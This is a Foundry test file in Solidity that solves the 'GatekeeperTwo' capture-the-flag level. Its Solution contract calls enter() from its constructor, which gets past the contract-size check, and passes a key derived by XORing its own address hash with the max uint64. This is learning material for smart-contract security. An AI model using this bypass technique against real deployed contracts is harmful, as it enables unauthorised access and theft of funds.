// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Solution {
    address contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        unchecked {
            bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
            IGatekeeperTwo(contractAddress).enter(key);
        }
    }
}

contract GatekeeperTwoTest is BaseTest {
    Solution public solution;

    function setUp() public override {
        super.setUp();
    }

    function test_Attack() public {
        vm.startBroadcast(deployer);
        solution = new Solution(contractAddress);
        address entrant = address(uint160(uint256(vm.load(contractAddress, bytes32(uint256(0))))));
        assertEq(entrant, deployer);
        vm.stopBroadcast();
    }
}
